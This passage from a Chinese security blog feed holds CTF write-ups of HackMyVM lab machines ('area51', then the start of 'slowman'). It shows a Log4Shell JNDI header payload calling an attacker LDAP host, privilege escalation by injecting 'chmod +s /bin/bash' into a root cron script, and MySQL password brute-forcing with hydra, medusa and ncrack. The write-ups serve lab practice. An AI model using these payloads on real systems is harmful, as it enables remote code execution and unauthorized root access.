</span></span><span style="display:flex;"><span>+ HTTP method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Allow&#39;</span> Header<span style="color:#f92672">)</span>: <span style="color:#e6db74">&#39;PUT&#39;</span> method could allow clients to save files on the web server.
</span></span><span style="display:flex;"><span>+ HTTP method <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Allow&#39;</span> Header<span style="color:#f92672">)</span>: <span style="color:#e6db74">&#39;DELETE&#39;</span> may allow clients to remove files on the web server.
</span></span><span style="display:flex;"><span>+ ERROR: Error limit <span style="color:#f92672">(</span>20<span style="color:#f92672">)</span> reached <span style="color:#66d9ef">for</span> host, giving up. Last error: opening stream: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t connect <span style="color:#f92672">(</span>connect error<span style="color:#f92672">)</span>: Cannot assign requested address
</span></span><span style="display:flex;"><span>+ Scan terminated: <span style="color:#ae81ff">20</span> error<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> and <span style="color:#ae81ff">6</span> item<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> reported on remote host
</span></span><span style="display:flex;"><span>+ End Time:           2024-04-16 19:50:13 <span style="color:#f92672">(</span>GMT8<span style="color:#f92672">)</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">21</span> seconds<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------
</span></span></code></pre></div><p>没有别的东西了</p>
<h2 id="log4j_rce">log4j_RCE</h2>
<p>去搜一下log4j的漏洞吧
<code>https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell#log4shell-vulnerability</code></p>
<p>amazing, 使用这个请求头去查询, 就能得到不一样的响应</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>~/workspace curl 192.168.89.13:8080 -H <span style="color:#e6db74">&#39;X-Api-Version:11 &#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Hello, world!#
</span></span></code></pre></div><p>使用discovery的payload没成功外带

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_area51_image_6.png" alt="HMV_area51_image_6" /><figcaption>HMV_area51_image_6</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_area51_image_7.png" alt="HMV_area51_image_7" /><figcaption>HMV_area51_image_7</figcaption></figure>


</p>
<p>选择使用这个工具
<a href="https://github.com/kozmer/log4j-shell-poc" target="_blank" rel="noopener nofollow noreferrer" >https://github.com/kozmer/log4j-shell-poc</a></p>
<p>需要注册个jdk Oracle 官网的账号, 好困, 下次再打</p>
<p>amazing

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_area51_image_8.png" alt="HMV_area51_image_8" /><figcaption>HMV_area51_image_8</figcaption></figure>


</p>
<h2 id="docker环境">docker环境</h2>
<p>进去之后是docker环境. 需要逃逸一下

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_area51_image_9.png" alt="HMV_area51_image_9" /><figcaption>HMV_area51_image_9</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ip a
</span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>4: eth0@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP
</span></span><span style="display:flex;"><span>    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span></code></pre></div><p>接触到了一个新的工具, fscan, 常见的内网扫描工具</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./fscan -h 172.17.0.2/16
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   ___                              _
</span></span><span style="display:flex;"><span>  / _ <span style="color:#ae81ff">\ </span>    ___  ___ _ __ __ _  ___| | __
</span></span><span style="display:flex;"><span> / /_<span style="color:#ae81ff">\/</span>____/ __|/ __| <span style="color:#960050;background-color:#1e0010">&#39;</span>__/ _<span style="color:#e6db74">`</span> |/ __| |/ /
</span></span><span style="display:flex;"><span>/ /_<span style="color:#ae81ff">\\</span>_____<span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\ </span><span style="color:#f92672">(</span>__| | | <span style="color:#f92672">(</span>_| | <span style="color:#f92672">(</span>__|   &lt;
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\_</span>___/     |___/<span style="color:#ae81ff">\_</span>__|_|  <span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>__|_|<span style="color:#ae81ff">\_\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>                     fscan version: 1.8.3
</span></span><span style="display:flex;"><span>start infoscan
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>icmp<span style="color:#f92672">)</span> Target 172.17.0.2      is alive
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>icmp<span style="color:#f92672">)</span> Target 172.17.0.1      is alive
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> LiveTop 172.17.0.0/16    段存活数量为: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> LiveTop 172.17.0.0/24    段存活数量为: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Icmp alive hosts len is: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>172.17.0.1:8080 open
</span></span><span style="display:flex;"><span>172.17.0.2:8080 open
</span></span><span style="display:flex;"><span>172.17.0.1:80 open
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> alive ports len is: <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>start vulscan
</span></span><span style="display:flex;"><span>172.17.0.1:22 open
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.17.0.1         code:200 len:1131   title:FBI Access
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.17.0.1:8080    code:400 len:277    title:None
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> WebTitle http://172.17.0.2:8080    code:400 len:277    title:None
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://172.17.0.1:8080 -H <span style="color:#e6db74">&#39;X-Api Version:${jndi:ldap://192.168.68.99:1389/a}&#39;</span>
</span></span></code></pre></div><p>好吧, 这样子好像不行, 之后回过来想想</p>
<h2 id="枚举">枚举</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /var/tmp
</span></span><span style="display:flex;"><span>ls -al
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>drwxrwxrwt    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x    <span style="color:#ae81ff">1</span> root     root          <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">2018</span> ..
</span></span><span style="display:flex;"><span>-rw-r--r--    <span style="color:#ae81ff">1</span> root     root            <span style="color:#ae81ff">10</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .roger
</span></span><span style="display:flex;"><span>cat .roger
</span></span><span style="display:flex;"><span>b3st4l13n
</span></span></code></pre></div><h2 id="ssh登录靶机">ssh登录靶机</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:~$ ls -al
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">36</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> roger roger <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root  root  <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> roger roger    <span style="color:#ae81ff">9</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> roger roger  <span style="color:#ae81ff">220</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bash_logout
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> roger roger <span style="color:#ae81ff">3644</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bashrc
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> roger roger <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .local
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> roger roger  <span style="color:#ae81ff">807</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .profile
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> roger roger   <span style="color:#ae81ff">69</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> shoppingList
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> roger roger  <span style="color:#ae81ff">373</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> SubjectDescription
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root  root  <span style="color:#ae81ff">1497</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> user.txt
</span></span><span style="display:flex;"><span>roger@area51:~$ cat user.txt
</span></span><span style="display:flex;"><span>                          <span style="color:#e6db74">`</span>--:::::::-.<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>                      .://:----------://:<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>                   <span style="color:#e6db74">`</span>:/:.-----------------+/<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>                  //-.--------------------:o-
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">`</span>+-.-----------------------:o:
</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">`</span>o-.------------------------:/s.
</span></span><span style="display:flex;"><span>               +-.-------------------------://o
</span></span><span style="display:flex;"><span>              .+.--------------------------///s<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>              +-.------------------------:////o.
</span></span><span style="display:flex;"><span>              s.----------------------:://///:s<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">`</span>o.------------------/:+/o+/////++
</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">`</span>o.------------------s/+/+/////+/<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>            .:o--------------::::/+//////++/.
</span></span><span style="display:flex;"><span>           -o+..:/:------------/////////:.<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>           /s:.<span style="color:#e6db74">`</span> <span style="color:#e6db74">`</span>+:---://:--//++/+/:.<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">`</span>oys:::/s--/o:.<span style="color:#e6db74">````</span>o+o:.
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">`</span>/oo+:++--s/:::/+o++<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">`</span>//:----:++++++/:<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>               .+.-------:o+<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>                o.-------/s<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>                o.------:o-
</span></span><span style="display:flex;"><span>                o.------+/
</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">`</span>.:/.--:/:+o
</span></span><span style="display:flex;"><span>             /o//oydNMm+:
</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">```</span>hMMNMNo-
</span></span><span style="display:flex;"><span>               :/ydysso/
</span></span><span style="display:flex;"><span>               -s/---/o<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>               -++:--//++<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>             <span style="color:#e6db74">`</span>+:--------:o.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  FLAG <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>ee11cbb19052e40b07aac0ca060c23ee<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>roger@area51:~$
</span></span></code></pre></div><h2 id="枚举-1">枚举</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:/opt$ find / -type f -name <span style="color:#e6db74">&#34;.*&#34;</span> 2&gt;/dev/null | grep -v  sys
</span></span><span style="display:flex;"><span>/etc/skel/.bash_logout
</span></span><span style="display:flex;"><span>/etc/skel/.profile
</span></span><span style="display:flex;"><span>/etc/skel/.bashrc
</span></span><span style="display:flex;"><span>/etc/cron.weekly/.placeholder
</span></span><span style="display:flex;"><span>/etc/.pwd.lock
</span></span><span style="display:flex;"><span>/etc/cron.daily/.placeholder
</span></span><span style="display:flex;"><span>/etc/.hostname.swp
</span></span><span style="display:flex;"><span>/etc/cron.d/.placeholder
</span></span><span style="display:flex;"><span>/etc/cron.hourly/.placeholder
</span></span><span style="display:flex;"><span>/etc/cron.monthly/.placeholder
</span></span><span style="display:flex;"><span>/run/network/.ifstate.lock
</span></span><span style="display:flex;"><span>/usr/share/dictionaries-common/site-elisp/.nosearch
</span></span><span style="display:flex;"><span>/home/roger/.bash_logout
</span></span><span style="display:flex;"><span>/home/roger/.profile
</span></span><span style="display:flex;"><span>/home/roger/.bashrc
</span></span><span style="display:flex;"><span>roger@area51:/opt$
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>roger@area51:/etc/skel$ cat /etc/passwd | grep bash
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>roger:x:1001:1001:,,,:/home/roger:/bin/bash
</span></span><span style="display:flex;"><span>kang:x:1000:1000:,,,:/kang:/bin/bash
</span></span><span style="display:flex;"><span>roger@area51:/etc/skel$ find / -type f -name <span style="color:#e6db74">&#34;kang&#34;</span> 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/etc/pam.d/kang
</span></span><span style="display:flex;"><span>roger@area51:/etc/skel$ cat /etc/pam.d/kang
</span></span><span style="display:flex;"><span>k4ng1sd4b3st
</span></span><span style="display:flex;"><span>roger@area51:/etc/skel$
</span></span></code></pre></div><h2 id="横向移动">横向移动</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kang@area51:~$ ls -al
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>drwxrwx---  <span style="color:#ae81ff">3</span> kang kang <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">19</span> 22:56 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> kang kang <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .local
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">8</span> Apr <span style="color:#ae81ff">19</span> 22:56 weComeInPeace.sh
</span></span><span style="display:flex;"><span>kang@area51:~$
</span></span></code></pre></div><p>weComeInPeace. sh这个文件有时出现有时没有&hellip;&hellip;&hellip;.. 这肯定是key</p>
<h2 id="利用定时任务提权">利用定时任务提权</h2>
<p>上pspy试试,有个script. sh</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2024/04/19 22:58:18 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>      | /sbin/init
</span></span><span style="display:flex;"><span>2024/04/19 22:58:18 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7132</span>   | /bin/sh /root/script.sh
</span></span><span style="display:flex;"><span>2024/04/19 22:58:18 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7133</span>   | sleep <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>2024/04/19 22:58:19 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7134</span>   | /bin/sh /root/script.sh
</span></span><span style="display:flex;"><span>2024/04/19 22:58:19 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7135</span>   | /bin/sh /root/script.sh
</span></span><span style="display:flex;"><span>2024/04/19 22:58:21 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>     PID<span style="color:#f92672">=</span><span style="color:#ae81ff">7136</span>   | /bin/sh /root/script.sh
</span></span></code></pre></div><p>使用下面的payload</p>
<p><code>for i in {1..10000}; do echo 'chmod +s /bin/bash' &gt;&gt; weComeInPeace.sh; done</code></p>
<p>然后就获得了suid的bash</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1# ls -al /bin/bash
</span></span><span style="display:flex;"><span>-rwsr-sr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1234376</span> Aug  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2021</span> /bin/bash
</span></span></code></pre></div><h2 id="root">root</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1# cd /root
</span></span><span style="display:flex;"><span>bash-5.1# ls -al
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">19</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">571</span> Apr <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2021</span> .bashrc
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">19</span>  <span style="color:#ae81ff">2021</span> .local
</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .mysql_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">161</span> Jul  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> .profile
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1561</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> root.txt
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">124</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> script.sh
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">0</span> Dec <span style="color:#ae81ff">21</span>  <span style="color:#ae81ff">2021</span> .script.sh.swp
</span></span><span style="display:flex;"><span>bash-5.1# cat root.txt
</span></span><span style="display:flex;"><span>                 :
</span></span><span style="display:flex;"><span>                         /<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>                         :-
</span></span><span style="display:flex;"><span>                        ..-
</span></span><span style="display:flex;"><span>                        - <span style="color:#e6db74">`</span>-
</span></span><span style="display:flex;"><span>                   <span style="color:#e6db74">``</span>...-........<span style="color:#e6db74">``</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">`</span>..<span style="color:#e6db74">``</span>-://:-::.<span style="color:#e6db74">`</span>  <span style="color:#e6db74">``</span>..
</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">`</span>-<span style="color:#e6db74">`</span>  /////+++++/.    <span style="color:#e6db74">`</span>-
</span></span><span style="display:flex;"><span>               -    s////:-..-:/<span style="color:#e6db74">`</span>    <span style="color:#e6db74">`</span>.
</span></span><span style="display:flex;"><span>              ..    +//:<span style="color:#e6db74">`</span>    +-<span style="color:#e6db74">`</span>-<span style="color:#e6db74">`</span>    -
</span></span><span style="display:flex;"><span>              -   -://+<span style="color:#e6db74">`</span>     +/ <span style="color:#e6db74">`</span>o<span style="color:#e6db74">`</span>   -
</span></span><span style="display:flex;"><span>              -   :/++//.<span style="color:#e6db74">`</span>   <span style="color:#e6db74">`</span>../+    -
</span></span><span style="display:flex;"><span>              <span style="color:#e6db74">`</span>.  <span style="color:#e6db74">`</span>+++++///:::/+o:    -
</span></span><span style="display:flex;"><span>               -   <span style="color:#e6db74">`</span>+++///++////o:    -
</span></span><span style="display:flex;"><span>               -    .++o+///////+:.   -
</span></span><span style="display:flex;"><span>               -    .+o+Ns:d-s+///// <span style="color:#e6db74">`</span>.
</span></span><span style="display:flex;"><span>               <span style="color:#e6db74">`</span>.   :/mhMmhMyM++//-. -
</span></span><span style="display:flex;"><span>                -   -/mMMMMMMMh+/-   -
</span></span><span style="display:flex;"><span>                -    +yMMMMMMN+o-<span style="color:#e6db74">`</span>  <span style="color:#e6db74">`</span>.    <span style="color:#e6db74">`</span>....
</span></span><span style="display:flex;"><span>         .-:-<span style="color:#e6db74">`</span>  ..  <span style="color:#e6db74">`</span>+hMmNNhN/+/:-  -   .//::///
</span></span><span style="display:flex;"><span>      :::/::+/.  -  .+hNsyd/d-o--: <span style="color:#e6db74">`</span>-  ://.<span style="color:#e6db74">`</span> <span style="color:#e6db74">```</span>
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">`</span>::.  //+  -<span style="color:#e6db74">`</span>  :++-++++++o...-  <span style="color:#e6db74">`</span>++<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>            .+/- <span style="color:#e6db74">`</span>-  -+://++///+.-:-  ///
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">`</span>+/+<span style="color:#e6db74">``</span>:-///://++///+//y+.-///
</span></span><span style="display:flex;"><span>             -////sssooooooooosssssoo///-
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">`</span>.+//+ooooossoooyssoosss+//:
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">`</span>.<span style="color:#e6db74">```</span>-:---///++///+++++++o+oo+++++/+/<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>  .//++//////////++////////////++///////-<span style="color:#e6db74">``</span>
</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">`</span>...<span style="color:#e6db74">`</span>  <span style="color:#e6db74">`</span>.------..-:///////+/:://////-
</span></span><span style="display:flex;"><span>                            <span style="color:#e6db74">`</span>-:/+++.   ...<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>63a9f0ea7bb98050796b649e85481845<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>bash-5.1# cat script.sh
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> true; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>  rm -rf /kang/*
</span></span><span style="display:flex;"><span>  sleep <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;echo hi&#34;</span> &gt; /kang/weComeInPeace.sh
</span></span><span style="display:flex;"><span>  sh /kang/*
</span></span><span style="display:flex;"><span>  sleep <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bash-5.1#
</span></span></code></pre></div>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/hackmyvm" term="sec/hackmyvm" label="sec/hackmyvm" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[slowman]]></title><link href="https://l1uyun.one/posts/hmv_slowman/" rel="alternate" type="text/html" />
            <id>https://l1uyun.one/posts/hmv_slowman/</id>
            
            <published>2024-02-15T15:44:24+08:00</published>
            <updated>2024-12-08T19:34:53+08:00</updated>
            
            
            <content type="html"><![CDATA[<h2 id="端口扫描">端口扫描</h2>
<p>网络环境问题,还是得 nmap 的全端口扫描</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_1.png" alt="HMM_slowman_image_1" /><figcaption>HMM_slowman_image_1</figcaption></figure>


</p>
<h2 id="ftp-匿名登录">ftp 匿名登录</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMM_slowman_image_2.png" alt="HMM_slowman_image_2" /><figcaption>HMM_slowman_image_2</figcaption></figure>


</p>
<h2 id="爆破-mysql-密码">爆破 mysql 密码</h2>
<p>trainerjeff
接下来得看 mysql 了
hydra 好慢
换了 ncrack 试试</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ncrack -T5 -v -u trainerjeff -P /usr/share/wordlists/rockyou.txt mysql://192.168.10.8
</span></span><span style="display:flex;"><span>sudo  medusa -h 192.168.10.8 -u trainerjeff -P /usr/share/wordlists/rockyou.txt -M mysql
</span></span><span style="display:flex;"><span>sudo hydra -l trainerjeff -P /usr/share/wordlists/rockyou.txt 192.168.10.8 mysql
